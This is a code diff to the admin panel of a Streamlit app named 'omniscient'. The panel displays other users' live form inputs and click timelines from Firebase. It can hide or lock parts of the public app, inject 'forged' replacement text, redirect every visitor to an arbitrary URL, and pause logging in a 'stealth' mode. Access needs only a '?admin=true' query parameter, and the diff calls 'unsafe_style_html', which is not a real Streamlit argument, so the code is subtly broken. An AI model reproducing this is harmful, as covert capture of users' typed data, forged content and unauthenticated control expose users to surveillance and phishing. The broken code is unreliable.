-                        st.code(line_trace, language="text")
+                st.write("---")
+                col_view_l, col_view_r = st.columns([1, 1.4])
+                with col_view_l:
+                    st.markdown("<p style='color:#FF9F43; font-weight:700;'>📥 CURRENT FORM STATE INPUT INJECTIONS</p>", unsafe_style_html=True)
+                    st.json(node.get("form_data", {}))
+                    st.metric(label="Calculated Session Interactions Counter", value=f"{node.get('total_clicks_count', 0)} Operations")
+                with col_view_r:
+                    st.markdown("<p style='color:#00FFCC; font-weight:700;'>📈 SEQUENTIAL CHRONO LOG STEP TRACE</p>", unsafe_style_html=True)
+                    for action_log_line in node.get("timeline", []):
+                        st.code(action_log_line, language="text")
                         
             st.write("---")
-            if _o_btn("🚨 Wipe All Active User Storage Databases Trace Logs", key="clear_all_user_logs_node"):
+            if _o_btn("🗑️ PURGE RADAR TRANSMISSION MEMORY LOGS", key="clear_radar_logs"):
                 requests.delete(f"{FIREBASE_URL}/omniscient_live_users.json")
-                st.success("Target streams disconnected and cleared!")
+                st.success("All remote session trace models have been erased.")
                 st.rerun()
         else:
-            st.info("Scanning transmission frequencies... No active external channels broadcasting sync signals right now.")
+            st.info("No external client connection vectors found streaming application metrics. Mainframe scanning active...")
 
     # --------------------------------------------------------------------
-    # TAB 2: ZERO TYPING AUTOMATED LAYOUT MANAGER
+    # TAB 2: EXCLUSION CONTROLLER - POINT & CLICK MUTATION ENGINE
     # --------------------------------------------------------------------
-    with m_tab2:
-        st.subheader("🎛️ Point-and-Click Component Auto Destruction Matrix")
-        discovered_registry = db_fetch("omniscient_registry")
+    with panel_tab2:
+        st.markdown("<p class=\"data-header\">🎛️ Discovered Structural Application Hook Layout Map</p>", unsafe_style_html=True)
+        global_elements_registry = db_fetch("omniscient_registry")
         
-        if discovered_registry:
-            st.success(f"Omniscient Core Hook Engine Auto-Detected `{len(discovered_registry)}` Active App Variables!")
-            selected_comp = _o_sel("Select Discovered Component Target:", list(discovered_registry.keys()))
+        if global_elements_registry and isinstance(global_elements_registry, dict):
+            # Perfect automated filter architecture out the admin panel traces completely from the registry options list
+            clean_discovered_keys = [
+                key for key in global_elements_registry.keys() 
+                if "Select Target" not in key 
+                and "Select Discovered" not in key 
+                and "Inject dynamic alternative" not in key
+            ]
             
-            st.warning(f"Targeting System Identity: **'{selected_comp}'** | Runtime Definition Category: `{discovered_registry[selected_comp]}`")
+            st.success(f"Automated Hook Matrix isolated `{len(clean_discovered_keys)}` Unique Application Interception Hooks.")
             
-            if selected_comp not in omni_rules["controls"]:
-                omni_rules["controls"][selected_comp] = {"hide": False, "disable": False}
-                
-            c_mod1, c_mod2 = st.columns(2)
-            with c_mod1:
-                flag_hide = _o_chk("👻 Execute Stealth Mutation (Hide from layout map entirely)", value=omni_rules["controls"][selected_comp].get("hide", False))
-            with c_mod2:
-                flag_disable = _o_chk("🔒 Enforce Infrastructure Freeze (Kill interaction/Make read-only)", value=omni_rules["controls"][selected_comp].get("disable", False))
-                
-            if _o_btn("Save Component Destruction Directives 🔒", key="commit_comp_rules"):
-                omni_rules["controls"][selected_comp]["hide"] = flag_hide
-                omni_rules["controls"][selected_comp]["disable"] = flag_disable
-                db_put("omniscient_rules", omni_rules)
-                st.success("Destruction directives written into live environment blocks!")
-                st.rerun()
-                
-            st.write("---")
-            st.subheader("📝 Dynamic Live Content Swapper Engine")
-            alt_text = _o_txt(f"Inject alternative forged layout message text for '{selected_comp}':", value=omni_rules["text_mutations"].get(selected_comp, ""))
+            targeted_component = _o_sel("🎯 Select Discovered Element Label (Zero Typing Needed):", clean_discovered_keys)
             
-            if _o_btn("Inject Text Swap Pattern 🔄", key="commit_text_swap"):
-                if alt_text: omni_rules["text_mutations"][selected_comp] = alt_text
-                else: omni_rules["text_mutations"].pop(selected_comp, None)
-                db_put("omniscient_rules", omni_rules)
-                st.success("Text mutation pipeline compiled!")
-                st.rerun()
+            if targeted_component:
+                st.warning(f"Target Selection Vector: **'{targeted_component}'** | Intercept Class Type: `{global_elements_registry[targeted_component]}`")
+                
+                if targeted_component not in omni_rules["controls"]:
+                    omni_rules["controls"][targeted_component] = {"hide": False, "disable": False}
+                    
+                mc1, mc2 = st.columns(2)
+                with mc1:
+                    toggle_hide = _o_chk("👻 Deploy Layout Concealment (Hide asset from application viewport entirely)", value=omni_rules["controls"][targeted_component].get("hide", False))
+                with mc2:
+                    toggle_disable = _o_chk("🔒 Enforce Input Pipeline Freeze (Lock field values / Force read-only state)", value=omni_rules["controls"][targeted_component].get("disable", False))
+                    
+                if _o_btn("Commit Modification Rules ⚡", key="save_mutator_directives"):
+                    omni_rules["controls"][targeted_component]["hide"] = toggle_hide
+                    omni_rules["controls"][targeted_component]["disable"] = toggle_disable
+                    db_put("omniscient_rules", omni_rules)
+                    st.success(f"Destruction parameters written down into framework pipelines for asset: '{targeted_component}'")
+                    st.rerun()
+                    
+                st.write("---")
+                st.markdown("#### 📝 Realtime Forged Static Text Content Swapper Matrix")
+                mutation_text_string = _o_txt(f"Inject dynamic alternative mock text string replacement for '{targeted_component}':", value=omni_rules["text_mutations"].get(targeted_component, ""))
+                
+                if _o_btn("Forge Mutation Pattern 🔄", key="save_text_mutation_string"):
+                    if mutation_text_string:
+                        omni_rules["text_mutations"][targeted_component] = mutation_text_string
+                    else:
+                        omni_rules["text_mutations"].pop(targeted_component, None)
+                    db_put("omniscient_rules", omni_rules)
+                    st.success("Text transformation algorithms recompiled live.")
+                    st.rerun()
         else:
-            st.info("Discovery map is pristine. Let normal stream users touch items to auto-register labels.")
+            st.info("Application hook landscape clear. Interception registries populate when external clients connect and load fields.")
 
     # --------------------------------------------------------------------
-    # TAB 3: INFRASTRUCTURE CLOUD DEPLOYMENT MODES
+    # TAB 3: SIMULATOR SYSTEM - RE-ROUTING PIPELINE AND CONTROL
     # --------------------------------------------------------------------
-    with m_tab3:
-        st.subheader("🌐 Global Environment Core Gate Configuration")
-        active_state_vector = omni_rules.get("global_status", "ONLINE")
-        st.markdown(f"Current Cluster Status Mode Flag: **`{active_state_vector}`**")
+    with panel_tab3:
+        st.markdown("<p class=\"data-header\">⚙️ Central Infrastructure Application Routing Matrix Settings</p>", unsafe_style_html=True)
+        active_status_flag = omni_rules.get("global_status", "ONLINE")
+        st.markdown(f"Active App Layer Pipeline Execution Directive State: **`{active_status_flag}`**")
         
-        selected_vector = _o_rad("Execute Global Infrastructure Vector Command Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "REDIRECT"])
-        custom_message_banner = _o_txt("Interception Banner Custom Alert Text String:", value=omni_rules.get("custom_msg", ""))
-        redirect_destination = _o_txt("Target Secure Routing Forward Link URL Endpoint Address:", value=omni_rules.get("redirect_url", ""))
+        chosen_directive_vector = _o_rad("Execute Infrastructure Command Route Directive:", ["ONLINE", "MAINTENANCE", "BUSY", "REDIRECT"])
+        custom_screen_notification = _o_txt("Interception Screen Notification Text Content:", value=omni_rules.get("custom_msg", ""))
+        redirect_endpoint_url = _o_txt("Target Redirection Forwarding Endpoint Web URL Link Address:", value=omni_rules.get("redirect_url", ""))
         
         st.write("---")
-        st.subheader("🛡️ Global Safety Switches")
-        global_freeze_gate = _o_chk("Lock Interception Shield (Freeze all interactive form spaces across all nodes)", value=omni_rules.get("freeze_all", False))
-        stealth_telemetry_gate = _o_chk("Stealth Operation (Pause writing runtime trace arrays)", value=omni_rules.get("stealth", False))
+        st.markdown("#### 🛡️ Global Security Enforcement Parameters Override")
+        global_override_freeze = _o_chk("Global Application Freeze Gate (Lock interactive input fields across all public nodes)", value=omni_rules.get("freeze_all", False))
+        global_stealth_telemetry = _o_chk("Deep Stealth Run Policy (Pause writing user interaction metrics arrays to database)", value=omni_rules.get("stealth_mode", False))
         
-        if _o_btn("Deploy Global Overhaul Protocols 🚀", key="commit_global_infrastructure_overhaul"):
-            omni_rules["global_status"] = selected_vector
-            omni_rules["custom_msg"] = custom_message_banner
-            omni_rules["redirect_url"] = redirect_destination
-            omni_rules["freeze_all"] = global_freeze_gate
-            omni_rules["stealth"] = stealth_telemetry_gate
+        if _o_btn("Deploy Global Overhaul Protocols 🚀", key="commit_global_mainframe_changes"):
+            omni_rules["global_status"] = chosen_directive_vector
+            omni_rules["custom_msg"] = custom_screen_notification
+            omni_rules["redirect_url"] = redirect_endpoint_url
+            omni_rules["freeze_all"] = global_override_freeze
+            omni_rules["stealth_mode"] = global_stealth_telemetry
             db_put("omniscient_rules", omni_rules)
-            st.success("Global structural policies updated inside core pipelines!")
+            st.success("Global network policies recompiled and synchronized down to production application pipelines.")
             st.rerun()
             
         st.write("---")
-        if _o_btn("🚨 Master Factory Reset Framework Settings", key="factory_reset_all_mainframe_configs"):
+        if _o_btn("🚨 RESET SYSTEM CONTROLLERS TO FACTORY PARAMS", key="factory_system_wipe"):
             requests.delete(f"{FIREBASE_URL}/omniscient_rules.json")
             requests.delete(f"{FIREBASE_URL}/omniscient_registry.json")
-            st.error("System configs deleted back to factory default!")
+            st.error("All structural configuration rules variables dropped. Restored default production settings.")
             st.rerun()
 
     st.write("---")
-    st.error("🚨 ADMINISTRATIVE ROOT ENVIRONMENT GATE OPEN. Remove '?admin=true' from path string query trail to return to standard layout viewport.")
+    st.markdown("<p style='color:#FF3366;font-size:11px;'>🚨 MAIN ADMINISTRATIVE ENVELOPE GATE INTERCEPT ENGAGED. Strip query string parameter map trails (?admin=true) from URL to navigate standard public viewports.</p>", unsafe_style_html=True)
     st.stop()
 
 # ========================================================================
